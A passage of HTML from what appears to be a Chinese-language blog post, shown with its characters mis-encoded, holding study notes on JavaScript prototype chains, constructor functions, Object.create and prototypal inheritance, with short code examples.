ä¹æ‰€æœ‰çš„å¯¹è±¡åœ¨åˆ›å»ºæ—¶ [[Prototype]] å±æ€§éƒ½ä¼šè¢«èµ‹äºˆä¸€ä¸ªéç©ºçš„å€¼ã€‚<br><code>å¯¹è±¡çš„ [[Prototype]] é“¾æ¥å¯ä»¥ä¸ºç©º</code>çš„æƒ…å†µï¼šé€šè¿‡Object.create(null)å¾—åˆ°çš„å¯¹è±¡ï¼Œå®ƒçš„ [[Prototype]] æ˜¯ä¸ºç©ºçš„ï¼Œä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºnullæ˜¯åŸå‹é“¾çš„é¡¶ç«¯ã€‚å®ƒæ²¡æœ‰[[Prototype]]ã€‚å¯¹åº”çš„å¯ä»¥å¯¹æ¯”ä¸‹<code>console.log(Object.create(&#123;&#125;))</code>å’Œ<code>console.log(Object.create(null))</code></p><p><strong>[[Prototype]]æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</strong>     </p><p><strong>ä½œç”¨:</strong> å­˜æ”¾é‚£äº›ä¸åœ¨å¯¹è±¡è‡ªèº«çš„å±æ€§ã€‚å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œæ­¤æ—¶å¯¹è±¡çš„å†…éƒ¨é»˜è®¤æ“ä½œ[[Get]]ï¼Œé¦–å…ˆä¼šæ£€æŸ¥å¯¹è±¡æœ¬èº«æ˜¯å¦æœ‰è¿™ä¸ªå±æ€§ï¼Œå¦‚æœæœ‰çš„è¯å°±ä½¿ç”¨å®ƒã€‚å¦‚æœæ²¡æœ‰çš„è¯ï¼Œ[[Get]] å°±ä¼šç»§ç»­è®¿é—®å¯¹è±¡çš„ [[Prototype]] é“¾ã€‚å¦‚æœæ‰¾åˆ°å°±è¿”å›è¯¥å±æ€§å€¼ï¼›å¦‚æœæ²¡æœ‰å°±ç»§ç»­å¯»æ‰¾ä¸‹ä¸€ä¸ª[[Prototype]]é“¾ï¼Œç›´åˆ°æ‰¾å®Œæ•´æ¡[[Prototype]]é“¾ã€‚è¿˜æ˜¯æ²¡æœ‰çš„è¯ï¼Œ[[Get]] å°±ä¼šè¿”å›undefinedã€‚</p><p><strong>è¡¥å……:</strong></p><ul><li><strong>ä½¿ç”¨ for..in éå†å¯¹è±¡æ—¶</strong> ä»»ä½•å¯ä»¥é€šè¿‡åŸå‹é“¾è®¿é—®åˆ° (å¹¶ä¸”æ˜¯ enumerable:true)çš„å±æ€§éƒ½ä¼šè¢«æšä¸¾ã€‚</li><li><strong>ä½¿ç”¨ in æ“ä½œç¬¦</strong> åŒæ ·ä¼šæŸ¥æ‰¾å¯¹è±¡çš„æ•´æ¡åŸå‹é“¾(<strong>æ— è®ºå±æ€§æ˜¯å¦å¯æšä¸¾</strong>)</li></ul><h4 id="5-1-1-Object-prototype"><a href="#5-1-1-Object-prototype" class="headerlink" title="5.1.1 Object.prototype"></a>5.1.1 <strong>Object.prototype</strong></h4><p>æ‰€æœ‰æ™®é€šçš„ [[Prototype]] é“¾æœ€ç»ˆéƒ½ä¼šæŒ‡å‘å†…ç½®çš„ Object.prototypeã€‚(Object.prototypeçš„[[Prototype]] æœ€ç»ˆä¼šæŒ‡å‘null)ã€‚<br>è¿™ä¸ª Object.prototype å¯¹è±¡ï¼ŒåŒ…å«äº† JavaScript ä¸­è®¸å¤šé€šç”¨çš„åŠŸèƒ½ï¼Œä¾‹å¦‚:toString() ï¼Œ valueOf()ï¼Œ hasOwnProperty(..)å’Œ isPrototypeOf(..)ã€‚</p><h4 id="5-1-2-å±æ€§è®¾ç½®å’Œå±è”½"><a href="#5-1-2-å±æ€§è®¾ç½®å’Œå±è”½" class="headerlink" title="5.1.2 å±æ€§è®¾ç½®å’Œå±è”½"></a>5.1.2 <strong>å±æ€§è®¾ç½®å’Œå±è”½</strong></h4><p><strong>æ³¨æ„:</strong> ä¹¦ä¸­æåˆ°çš„åŠ¨è¯<code>å±è”½</code>å…¶å®æŒ‡çš„å°±æ˜¯åœ¨å¯¹è±¡ä¸Šåˆ›å»ºåŒåå±æ€§(åŸå‹é“¾ä¸Šå·²æœ‰è¯¥å±æ€§)ã€‚ï¼ˆå¥½åƒä¸æ˜¯å¾ˆé‡è¦ï¼Œä»¥åæŠ½æ—¶é—´å†çœ‹ï¼‰</p><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b5220c3a82ce%EF%BC%9Fw=1375&h=962&f=png&s=207062"></p><h3 id="5-2-â€œç±»â€"><a href="#5-2-â€œç±»â€" class="headerlink" title="5.2 â€œç±»â€"></a>5.2 â€œç±»â€</h3><ul><li>JavaScripté‡Œåªæœ‰å¯¹è±¡ï¼Œæ²¡æœ‰ç±»ï¼</li><li>JavaScriptä¸éœ€è¦é€šè¿‡ç±»æ¥æŠ½è±¡å¯¹è±¡ï¼Œè€Œæ˜¯è‡ªå·±ç›´æ¥åˆ›å»ºå¯¹è±¡ï¼Œå¹¶å®šä¹‰å¯¹è±¡çš„è¡Œä¸ºã€‚</li></ul><h4 id="5-2-1-â€œç±»â€å‡½æ•°"><a href="#5-2-1-â€œç±»â€å‡½æ•°" class="headerlink" title="5.2.1 â€œç±»â€å‡½æ•°"></a>5.2.1 <strong>â€œç±»â€å‡½æ•°</strong></h4><p><strong>â€œç±»â€å‡½æ•°:</strong> JavaScriptç”¨æ¥æ¨¡ä»¿ç±»çš„å‡½æ•°å°±è¢«ç§°ä¸ºç±»å‡½æ•°ï¼Œå…¶å®å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„æ„é€ å‡½æ•°ã€‚        </p><p><strong>â€œç±»â€å‡½æ•°æ¨¡æ‹Ÿç±»çš„å…³é”®:</strong> æ‰€æœ‰çš„å‡½æ•°é»˜è®¤éƒ½ä¼šæ‹¥æœ‰ä¸€ä¸ªåä¸º prototype çš„å…¬æœ‰å¹¶ä¸”ä¸å¯æšä¸¾çš„å±æ€§ï¼Œå®ƒä¼šæŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡ã€‚å½“æˆ‘ä»¬é€šè¿‡new å‡½æ•°æ¥å¾—åˆ°å®ä¾‹å¯¹è±¡æ—¶ï¼Œæ­¤æ—¶newä¼šç»™å®ä¾‹å¯¹è±¡ä¸€ä¸ªå†…éƒ¨çš„ [[Prototype]]å±æ€§ï¼Œå®ä¾‹å¯¹è±¡å†…éƒ¨çš„[[Prototype]]å±æ€§ä¸æ„é€ å‡½æ•°çš„prototypeå±æ€§éƒ½æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ã€‚é‚£JSçš„è¿™ä¸ªç‰¹æ€§æ€ä¹ˆæ¨¡æ‹Ÿç±»å‘¢ï¼Ÿé¦–å…ˆ<strong>ç±»çš„æœ¬è´¨å°±æ˜¯å¤åˆ¶ï¼</strong>æˆ‘ä»¬å¯ä»¥å°†ç±»é‡Œçš„å±æ€§æ”¾åœ¨å‡½æ•°çš„prototypeå±æ€§é‡Œï¼Œè¿™æ ·è¯¥å‡½æ•°çš„å®ä¾‹å¯¹è±¡å°±å¯ä»¥é€šè¿‡<a href="%E5%8E%9F%E5%9E%8B%E9%93%BE">[Prototype]</a>è®¿é—®è¿™äº›å±æ€§ã€‚è¿™ç§è¡Œä¸ºç§°ä¸ºåŸå‹ç»§æ‰¿ã€‚è¿™æ ·å°±å®ç°äº†ä¼ªâ€å¤åˆ¶â€ï¼Œå¯ä»¥è¾¾åˆ°å’Œç±»ç›¸ä¼¼çš„æ•ˆæœ.</p><p><strong>æ³¨æ„:</strong> è™½ç„¶è¯´æ‰€æœ‰çš„å‡½æ•°é»˜è®¤éƒ½ä¼šæ‹¥æœ‰ä¸€ä¸ªåä¸º prototypeå±æ€§ï¼Œä½†ä¹Ÿæœ‰ç‰¹æ®Šçš„æ—¶å€™å°±æ˜¯é€šè¿‡bind()ç¡¬ç»‘å®šæ—¶æ‰€è¿”å›çš„<strong>ç»‘å®šå‡½æ•°ï¼Œå®ƒæ˜¯æ²¡æœ‰prototypeå±æ€§çš„!</strong></p><p><strong>å›¾è§£çœŸæ­£çš„ç±»ä¸JSçš„æ¨¡æ‹Ÿç±»:</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b57bbca1ee25%EF%BC%9Fw=523&h=523&f=png&s=68402"></p><p><strong>å…³äºåŸå‹ç»§æ‰¿è¿™ä¸ªåå­—çš„ç–¯ç‹‚åæ§½:</strong>      ä½œè€…çš„åæ§½ä¸»è¦é›†ä¸­åœ¨â€ç»§æ‰¿â€ä¸¤ä¸ªå­—ï¼ŒåŸå› æ˜¯åœ¨é¢å‘ç±»çš„è¯­è¨€ä¸­ï¼Œâ€ç»§æ‰¿â€æ„å‘³ç€å¤åˆ¶ï¼Œä½†åœ¨JavaScripté‡ŒåŸå‹ç»§æ‰¿å´æ ¹æœ¬ä¸æ˜¯è¿™ä¸ªæ„æ€ï¼Œå®ƒå¹¶æ²¡æœ‰å¤åˆ¶ï¼Œè€Œæ˜¯ç”¨åŸå‹é“¾æ¥å®ç°ã€‚</p><h4 id="5-2-2-â€œæ„é€ å‡½æ•°â€"><a href="#5-2-2-â€œæ„é€ å‡½æ•°â€" class="headerlink" title="5.2.2 â€œæ„é€ å‡½æ•°â€"></a>5.2.2 <strong>â€œæ„é€ å‡½æ•°â€</strong></h4><p>æ„é€ å‡½æ•°ä¹‹æ‰€ä»¥æ˜¯æ„é€ å‡½æ•°ï¼Œæ˜¯å› ä¸ºå®ƒ<strong>è¢«newè°ƒç”¨</strong>ï¼Œå¦‚æœæ²¡è¢«newè°ƒç”¨ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ã€‚å®é™…ä¸Šï¼Œnewä¼šåŠ«æŒæ‰€æœ‰æ™®é€šå‡½æ•°å¹¶ç”¨æ„é€ å¯¹è±¡çš„å½¢å¼æ¥è°ƒç”¨å®ƒï¼Œå¹¶ä¸”æ— è®ºå¦‚ä½•éƒ½ä¼šæ„é€ è¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚</p><h4 id="5-2-3-æŠ€æœ¯"><a href="#5-2-3-æŠ€æœ¯" class="headerlink" title="5.2.3 æŠ€æœ¯"></a>5.2.3 <strong>æŠ€æœ¯</strong></h4><p><strong>prototype.constructor:</strong><br>ä¸€ä¸ªå¯¹è±¡è®¿é—®constructoræ—¶ï¼Œä¼š<strong>é»˜è®¤è®¿é—®å…¶åŸå‹å¯¹è±¡</strong>ä¸Šçš„constructorå±æ€§ã€‚</p><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b5a12dfc7024%EF%BC%9Fw=573&h=463&f=png&s=87705"></p><p><strong>æ³¨æ„:</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* .. */</span> &#125;</span><br><span class="line">Foo.prototype = &#123; <span class="comment">/* .. */</span> &#125;; <span class="comment">// æœ‰æ—¶å€™æˆ‘ä»¬ä¼šéœ€è¦åˆ›å»ºä¸€ä¸ªæ–°åŸå‹å¯¹è±¡ï¼Œå› æ­¤ä¹Ÿä¸ä¼šæœ‰é»˜è®¤çš„constructorå±æ€§æŒ‡å‘æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment">// éœ€è¦åœ¨ Foo.prototype ä¸Šâ€œä¿®å¤â€ä¸¢å¤±çš„ .constructor å±æ€§</span></span><br><span class="line"><span class="comment">// å…³äº defineProperty(..)ï¼Œå‚è§ç¬¬ 3 ç«  </span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty( Foo.prototypeï¼Œ <span class="string">&quot;constructor&quot;</span> ï¼Œ &#123;</span><br><span class="line">  <span class="attr">enumerable</span>: <span class="literal">false</span>ï¼Œ<span class="comment">//ä¸å¯æšä¸¾</span></span><br><span class="line">  <span class="attr">writable</span>: <span class="literal">true</span>ï¼Œ</span><br><span class="line">  <span class="attr">configurable</span>: <span class="literal">true</span>ï¼Œ</span><br><span class="line">  <span class="attr">value</span>: Foo <span class="comment">// è®© .constructor æŒ‡å‘ Foo</span></span><br><span class="line">&#125; );</span><br><span class="line"><span class="comment">//ä¸Šé¢è¿™ç§æ–¹æ³•æ˜¯æ¯”è¾ƒä¸¥è°¨ï¼Œä¹Ÿæ¯”è¾ƒéº»çƒ¦çš„.å¹¶ä¸”ä½¿ç”¨Object.defineProperty()é£é™©æ˜¯å¾ˆå¤§çš„.</span></span><br><span class="line"><span class="comment">//æ‰€ä»¥æˆ‘ä»¬å®é™…æ˜¯è¿™æ ·ä¿®æ”¹çš„</span></span><br><span class="line">Foo.prototype.constructor=Foo; <span class="comment">//ç›´æ¥å°†å…¶èµ‹å€¼Foo å”¯ä¸€è¦æ³¨æ„çš„æ˜¯æ­¤æ—¶constructoræ˜¯å¯æšä¸¾çš„.ä¼šè¢«å®ä¾‹å¯¹è±¡çš„for..in..éå†åˆ°.</span></span><br></pre></td></tr></table></figure><h3 id="5-3-åŸå‹-ç»§æ‰¿"><a href="#5-3-åŸå‹-ç»§æ‰¿" class="headerlink" title="5.3 (åŸå‹)ç»§æ‰¿"></a>5.3 (åŸå‹)ç»§æ‰¿</h3><p><strong>åŸå‹å¯¹è±¡åˆ°åŸå‹å¯¹è±¡çš„ç»§æ‰¿:</strong><br>ä¾‹å¦‚:Bar.prototype åˆ° Foo.prototype çš„å§”æ‰˜å…³ç³»ï¼Œ<br>æ­£ç¡®çš„JavaScriptä¸­â€œåŸå‹é£æ ¼â€:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Foo.prototype.myName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Bar</span>(<span class="params">nameï¼Œlabel</span>) </span>&#123; </span><br><span class="line">  Foo.call( <span class="built_in">this</span>ï¼Œ name ); </span><br><span class="line">  <span class="built_in">this</span>.label = label;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ Bar.prototype å¯¹è±¡ï¼Œå¹¶ä¸”å®ƒçš„[[Prototype]] å…³è”Foo.prototype </span></span><br><span class="line">Bar.prototype = <span class="built_in">Object</span>.create( Foo.prototype );</span><br><span class="line"><span class="comment">// æ³¨æ„!Object.create()æ˜¯è¿”å›ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œæ‰€ä»¥ç°åœ¨æ²¡æœ‰ Bar.prototype.constructor äº† </span></span><br><span class="line"><span class="comment">// å¦‚æœä½ éœ€è¦è¿™ä¸ªå±æ€§çš„è¯å¯èƒ½éœ€è¦æ‰‹åŠ¨ä¿®å¤ä¸€ä¸‹å®ƒ</span></span><br><span class="line">Bar.prototype.myLabel = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.label;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> Bar( <span class="string">&quot;a&quot;</span>ï¼Œ <span class="string">&quot;obj a&quot;</span> );</span><br><span class="line"></span><br><span class="line">a.myName(); <span class="comment">// &quot;a&quot;</span></span><br><span class="line">a.myLabel(); <span class="comment">// &quot;obj a&quot;</span></span><br></pre></td></tr></table></figure><p>é”™è¯¯ç”¨æ³•:</p><ul><li> <code>Bar.prototype = Foo.prototype;</code> æ­¤æ—¶å¹¶ä¸ä¼šåˆ›å»ºä¸€ä¸ªå…³è”åˆ° Bar.prototype çš„æ–°å¯¹è±¡ï¼Œå®ƒåªæ˜¯è®© Bar.prototype ç›´æ¥å¼•ç”¨ Foo.prototype å¯¹è±¡ã€‚ å› æ­¤å½“ä½ æ‰§è¡Œç±»ä¼¼ Bar.prototype. myLabel = â€¦ çš„èµ‹å€¼è¯­å¥æ—¶ä¼šç›´æ¥ä¿®æ”¹ Foo.prototype å¯¹è±¡æœ¬èº«ã€‚</li><li> <code>Bar.prototype = new Foo();</code> å®ƒä½¿ç”¨ äº† Foo(..) çš„â€œæ„é€ å‡½æ•°è°ƒç”¨â€ï¼Œå¦‚æœå‡½æ•° Foo æœ‰ä¸€äº›å…¶ä»–æ“ä½œçš„è¯ï¼Œå°¤å…¶æ˜¯ä¸thisæœ‰å…³çš„çš„è¯ï¼Œå°±ä¼šå½±å“åˆ° Bar() çš„â€œåä»£â€ï¼Œåæœä¸å ªè®¾æƒ³ã€‚</li></ul><p><strong>ç»“è®º:</strong> è¦åˆ›å»ºä¸€ä¸ªåˆé€‚çš„å…³è”å¯¹è±¡ï¼Œæˆ‘ä»¬<strong>éœ€ä½¿ç”¨ Object.create(..)</strong> è€Œä¸æ˜¯ä½¿ç”¨å…·æœ‰å‰¯ä½œç”¨çš„ Foo(..)ã€‚è¿™æ ·åšå”¯ä¸€çš„ç¼ºç‚¹å°±æ˜¯éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ç„¶åæŠŠæ—§å¯¹è±¡æŠ›å¼ƒæ‰(ä¸»è¦æ˜¯éœ€è¦æ‰‹åŠ¨è®¾ç½®constructor)ï¼Œä¸èƒ½ç›´æ¥ä¿®æ”¹å·²æœ‰çš„é»˜è®¤å¯¹è±¡ã€‚</p><p><strong>æ£€æŸ¥â€ç±»â€å…³ç³»</strong>        </p><ul><li><strong>instanceof æ“ä½œç¬¦</strong>: éªŒè¯å·¦è¾¹çš„æ™®é€šå¯¹è±¡çš„æ•´æ¡[[prototype]]é“¾æ˜¯å¦æœ‰æŒ‡å‘å³è¾¹å‡½æ•°çš„prototypeï¼Œä¾‹å¦‚:<code>a instanceof Foo</code>ã€‚</li><li><strong>isPrototypeOf(..)  æ–¹æ³•</strong>: éªŒè¯åœ¨å¯¹è±¡ a çš„æ•´æ¡ [[Prototype]] é“¾ä¸­æ˜¯å¦å‡ºç°è¿‡ åŸå‹å¯¹è±¡b.ä¾‹å¦‚:<code>b.isPrototypeOf( a );</code></li></ul><p><strong>æ³¨æ„:</strong> å¦‚æœä½¿ç”¨å†…ç½®çš„ .bind(..) å‡½æ•°æ¥ç”Ÿæˆä¸€ä¸ª<strong>ç¡¬ç»‘å®šå‡½æ•°</strong>(å‚è§ç¬¬ 2 ç« )çš„è¯ï¼Œ è¯¥å‡½æ•°<strong>æ˜¯æ²¡æœ‰ .prototype å±æ€§çš„</strong>ã€‚å¦‚æœç¡¬ç»‘å®šå‡½æ•°instanceof çš„è¯ï¼Œåˆ™å…¶bindçš„ ç›®æ ‡å‡½æ•°çš„prototypeä¼šæˆä¸ºç¡¬ç»‘å®šå‡½æ•°çš„prototype.</p><p><strong>å…³äº__proto__</strong>:<br>æˆ‘ä»¬çŸ¥é“å‡½æ•°å¯ä»¥ç›´æ¥é€šè¿‡prototypeå±æ€§ç›´æ¥è®¿é—®åŸå‹å¯¹è±¡ã€‚é‚£æ€ä¹ˆè®¿é—®å‘¢ï¼Ÿ<br>åœ¨ES5ä¹‹ä¸­çš„æ ‡å‡†æ–¹æ³•:é€šè¿‡Object.getPrototypeOf(  )æ–¹æ³•æ¥è·å–å¯¹è±¡åŸå‹.<code>Object.getPrototypeOf( a ) === Foo.prototype; // true</code>ï¼Œ<br>å¦ä¸€ç§æ–¹æ³•:åœ¨ ES6 ä¹‹å‰å¹¶ä¸æ˜¯æ ‡å‡†ï¼Œä½†å´è¢«ç»å¤§å¤šæ•°æµè§ˆå™¨æ”¯æŒçš„ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥è®¿é—®å†…éƒ¨[[prototype]]å¯¹è±¡.é‚£å°±æ˜¯<code>__proto__</code>.ä¾‹å¦‚:<code>a.__proto__ === Foo.prototype; // true</code>ã€‚ä½ ç”šè‡³å¯ä»¥é€šè¿‡<code>.__proto__.__ptoto__... </code>æ¥è®¿é—®æ•´ä¸ªåŸå‹é“¾ã€‚  <code>.__proto__ </code>å®é™…ä¸Šå¹¶ä¸å­˜åœ¨äºä½ æ­£åœ¨ä½¿ç”¨çš„å¯¹è±¡ä¸­ï¼Œå¹¶ä¸”å®ƒçœ‹èµ·æ¥å¾ˆåƒä¸€ä¸ªå±æ€§ï¼Œä½†æ˜¯å®é™…ä¸Šå®ƒæ›´åƒä¸€ä¸ª getter/setter(è§ç¬¬ä¸‰ç« )ã€‚</p><h3 id="5-4-å¯¹è±¡å…³è”"><a href="#5-4-å¯¹è±¡å…³è”" class="headerlink" title="5.4 å¯¹è±¡å…³è”"></a>5.4 å¯¹è±¡å…³è”</h3><p>[[Prototype]] æœºåˆ¶å°±æ˜¯å­˜åœ¨äºå¯¹è±¡ä¸­çš„ä¸€ä¸ªå†…éƒ¨é“¾æ¥ï¼Œ<strong>å®ƒä¼šå¼•ç”¨å…¶ä»–å¯¹è±¡ã€‚</strong></p><p>è¿™ä¸ªé“¾æ¥çš„ä½œç”¨æ˜¯:å¦‚æœåœ¨å¯¹è±¡ä¸Šæ²¡æœ‰æ‰¾åˆ°éœ€è¦çš„å±æ€§æˆ–è€…æ–¹æ³•å¼•ç”¨ï¼Œå¼•æ“å°±ä¼šç»§ç»­åœ¨ [[Prototype]] å…³è”çš„å¯¹è±¡ä¸Šè¿›è¡ŒæŸ¥æ‰¾ã€‚åŒç†ï¼Œå¦‚æœåœ¨åè€…ä¸­ä¹Ÿæ²¡æœ‰æ‰¾åˆ°éœ€è¦çš„å¼•ç”¨å°±ä¼šç»§ç»­æŸ¥æ‰¾å®ƒçš„ [[Prototype]]ï¼Œä»¥æ­¤ç±»æ¨ã€‚è¿™ä¸€ç³»åˆ—å¯¹è±¡çš„é“¾æ¥è¢«ç§°ä¸º<strong>åŸå‹é“¾</strong>ã€‚</p><h4 id="5-4-1-åˆ›å»ºå…³è”"><a href="#5-4-1-åˆ›å»ºå…³è”" class="headerlink" title="5.4.1 åˆ›å»ºå…³è”"></a>5.4.1 <strong>åˆ›å»ºå…³è”</strong></h4><p><strong>é—®:</strong>â€œæˆ‘ä»¬å·²ç»æ˜ç™½äº†ä¸ºä»€ä¹ˆ JavaScript çš„ [[Prototype]] æœºåˆ¶å’Œç±»ä¸ä¸€æ ·ï¼Œä¹Ÿæ˜ç™½äº†å®ƒå¦‚ä½•å»ºç«‹å¯¹è±¡é—´çš„å…³è”ã€‚â€<br><strong>ç­”:</strong> ç±»çš„æœºåˆ¶æ˜¯å¤åˆ¶ï¼ŒJavaScripté‡ŒåŸå‹é“¾çš„æœºåˆ¶æ˜¯å¼•ç”¨.    </p><p><strong>é—®:</strong>â€œé‚£ [[Prototype]] æœºåˆ¶çš„æ„ä¹‰æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿä¸ºä»€ä¹ˆ JavaScript å¼€å‘è€…è´¹è¿™ä¹ˆå¤§çš„åŠ›æ°”(æ¨¡æ‹Ÿç±»)åœ¨ä»£ç ä¸­åˆ›å»ºè¿™äº›å…³è”å‘¢ï¼Ÿâ€<br><strong>ç­”:</strong> æ„ä¹‰å°±æ˜¯æ¨¡æ‹Ÿç±»ï¼ŒJavaScriptä¸éœ€è¦å¤åˆ¶è€Œé€šè¿‡åŸå‹é“¾å®ç°â€å®ä¾‹â€å¯¹â€ç±»â€çš„â€ç»§æ‰¿(å…¶å®å°±æ˜¯å¼•ç”¨)â€ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†å®ä¾‹å¯¹è±¡å¯¹æŸäº›å±æ€§çš„å¤ç”¨.</p><p><strong><code>Object.create(..)</code></strong><br>â€œObject.create(..) ä¼šåˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡(bar)å¹¶æŠŠå®ƒå…³è”åˆ°æˆ‘ä»¬æŒ‡å®šçš„å¯¹è±¡(foo)ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å……åˆ†å‘æŒ¥ [[Prototype]] æœºåˆ¶çš„å¨åŠ›(å§”æ‰˜)å¹¶ä¸”é¿å…ä¸å¿…è¦çš„éº»çƒ¦(æ¯”å¦‚ä½¿ç”¨ new çš„æ„é€ å‡½æ•°è°ƒç”¨ä¼šç”Ÿæˆ .prototype å’Œ .constructor å¼•ç”¨)ã€‚â€å®é™…ä¸Šè¿™ä¸ªæ–¹æ³•å°±æ˜¯åˆ›å»ºè¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè¿™ä¸ªæ–°å¯¹è±¡çš„åŸå‹([[Prototype]])ä¼šç»‘å®šä¸ºæˆ‘ä»¬è¾“å…¥çš„å‚æ•°å¯¹è±¡fooï¼Œå¹¶ä¸”ç”±äºä¸æ˜¯é€šè¿‡æ„é€ å‡½æ•°çš„å½¢å¼ï¼Œæ‰€ä»¥ä¸éœ€è¦ä¸ºå‡½æ•°å•ç‹¬è®¾ç½®prototypeã€‚è™½ç„¶Object.create(..)å¾ˆå¥½ï¼Œä½†å®é™…æˆ‘ä»¬ä½¿ç”¨çš„æ›´å¤šçš„è¿˜æ˜¯æ„é€ å‡½æ•°å½¢å¼.<br><strong>æ³¨æ„:</strong>  Object.create(..) çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šäº†éœ€è¦æ·»åŠ åˆ°æ–°å¯¹è±¡ä¸­çš„å±æ€§åä»¥åŠè¿™äº›å±æ€§çš„å±æ€§æè¿°ç¬¦(å‚è§ç¬¬ 3 ç« )ã€‚</p><p><strong><code>Object.create(null)</code></strong><br>â€œObject.create(null) ä¼šåˆ›å»ºä¸€ä¸ªæ‹¥æœ‰ç©º[[Prototype]] é“¾æ¥çš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ— æ³•è¿›è¡Œå§”æ‰˜ã€‚ç”±äºè¿™ä¸ªå¯¹è±¡æ²¡æœ‰åŸå‹é“¾ï¼Œæ‰€ä»¥ instanceof æ“ä½œç¬¦æ— æ³•è¿›è¡Œåˆ¤æ–­ï¼Œå› æ­¤æ€»æ˜¯ä¼šè¿”å› falseã€‚ <strong>è¿™äº›ç‰¹æ®Šçš„ç©º [[Prototype]] å¯¹è±¡é€šå¸¸è¢«ç§°ä½œâ€œå­—å…¸â€ï¼Œå®ƒä»¬å®Œå…¨ä¸ä¼šå—åˆ°åŸå‹é“¾çš„å¹²æ‰°ï¼Œå› æ­¤éå¸¸é€‚åˆç”¨æ¥å­˜å‚¨æ•°æ®ã€‚</strong>â€œ</p><h4 id="5-4-2-å…³è”å…³ç³»æ˜¯å¤‡ç”¨"><a href="#5-4-2-å…³è”å…³ç³»æ˜¯å¤‡ç”¨" class="headerlink" title="5.4.2 å…³è”å…³ç³»æ˜¯å¤‡ç”¨"></a>5.4.2 <strong>å…³è”å…³ç³»æ˜¯å¤‡ç”¨</strong></h4><p><strong>[[Prototype]] çš„æœ¬è´¨ä½œç”¨:</strong>      â€œå¤„ç†â€œç¼ºå¤±â€å±æ€§æˆ–è€…æ–¹æ³•æ—¶çš„ä¸€ç§å¤‡ç”¨é€‰é¡¹ã€‚â€(å³å¤‡ç”¨è®¾è®¡æ¨¡å¼).ä½†éšåè¿›è¡Œäº†å¦å®šâ€ä½†æ˜¯è¿™åœ¨ JavaScript ä¸­å¹¶ä¸æ˜¯å¾ˆå¸¸è§ã€‚æ‰€ä»¥å¦‚æœä½ ä½¿ç”¨çš„æ˜¯è¿™ç§æ¨¡å¼ï¼Œé‚£æˆ–è®¸åº”å½“é€€åä¸€æ­¥å¹¶é‡æ–°æ€è€ƒä¸€ä¸‹è¿™ç§æ¨¡å¼æ˜¯å¦åˆé€‚ã€‚â€ ä½œè€…ç»™å‡ºçš„è§‚ç‚¹æ˜¯:â€è¿›è¡Œå§”æ‰˜è®¾è®¡æ¨¡å¼ï¼Œå³ä¾‹å­ä¸­çš„å†…éƒ¨å§”æ‰˜(å°±æ˜¯åœ¨å¯¹è±¡é‡Œå¥—äº†ä¸ªå£³å†å¼•ç”¨äº†ä¸€éï¼Œä¸ºçš„æ˜¯å°†å§”æ‰˜è¿›è¡Œéšè—).è¿™æ ·å¯ä»¥ä½¿æˆ‘ä»¬çš„APIè®¾è®¡å¾—æ›´åŠ æ¸…æ™°.â€æ–‡ä¸­çš„æ¸…æ™°æ˜¯æŒ‡ï¼Œå½“æˆ‘ä»¬éœ€è¦å¼•ç”¨åŸå‹å¯¹è±¡çš„å±æ€§æ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬åœ¨å¯¹è±¡å†…éƒ¨è®¾ç½®å¯¹åº”ä¸“é—¨çš„å±æ€§(ä¾‹å­ä¸­çš„doCool)ï¼Œè¿›è¡Œå†…éƒ¨å§”æ‰˜(å…¶å®å°±æ˜¯å¥—ä¸ªå£³è¿›è¡Œéšè—).è¿™æ ·æˆ‘ä»¬<strong>å¯¹è±¡çš„å±æ€§å°±æ˜¯â€å®Œæ•´â€çš„.</strong></p><p>åœ¨å®é™…å·¥ä½œä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸å°±æ˜¯æŠŠåŸå‹å¯¹è±¡ä½œä¸ºå­˜æ”¾å¯¹è±¡çš„å…¬å…±å±æ€§æ–¹æ³•çš„åœ°æ–¹.å¯¹äºä¸€èˆ¬æ¯”è¾ƒé‡è¦çš„æ“ä½œæ‰ä¼šåœ¨å¯¹è±¡é‡Œè¿›è¡Œå†…éƒ¨å§”æ‰˜(éšè—å§”æ‰˜)!</p><h3 id="5-5-å°ç»“"><a href="#5-5-å°ç»“" 